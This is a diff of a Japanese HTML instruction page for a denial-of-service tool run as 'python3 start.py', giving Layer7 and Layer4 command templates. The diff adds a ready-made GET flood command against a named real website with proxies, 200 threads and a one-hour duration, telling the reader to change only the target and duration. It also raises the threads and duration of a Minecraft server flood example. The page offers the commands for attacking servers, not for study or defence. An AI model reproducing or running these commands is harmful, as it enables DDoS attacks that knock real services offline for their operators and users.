@@ -162,14 +162,16 @@
                     </div>
                     <div class="text_area mgb_20">
                         <p class="mchar">以下のコマンドをそのままコピペして使用せずに攻撃先に合わせ書き換えて下さい。あとで、痛い目見ますよ。</p>
-                        <p>Layer7での入力例</p>
-                        <b>python3 start.py <種類> <攻撃先URL> <socks_type5.4.1> <スレッド> <串リスト> <rpc> <存続期間></b><br>
-                        <p>Layer4での入力例</p>
+                        <p>Layer7の基本</p>
+                        <b>python3 start.py <種類> <攻撃先URL> <串のタイプ> <スレッド> <串リスト> <rpc> <継続時間></b><br>
+                        <p>下のコマンドは攻撃先URLと継続時間を変えるだけでよろしい</p>
+                        <code>
+                            python3 start.py GET http://prkorea.com 1 200 proxy.txt 100 3600
+                        </code><br>
+                        <p>Layer4の基本</p>
                         <b>python3 start.py <種類> <ip:port> <スレッド> <存続期間> <reflector file, (only use with Amplification></b><br><br>
-                        <p>Layer7でサーバがApacheの場合</p>
-                        <b>python3 start.py APACHE https://example.com 4 894 proxy.txt 61 1693</b><br>
                         <p>Layer4でマイクラサーバを攻撃する場合</p>
-                        <b>python3 start.py MINECRAFT 11.45.1.4:810 947 2293</b><br>
+                        <b>python3 start.py MINECRAFT 11.45.1.4:810 2000 3600</b><br>
                         <b></b><br>
                         <big><b>詳しい内容はpython3 start.pyを入力して試して下さい。</b></big><br>
                         <br>
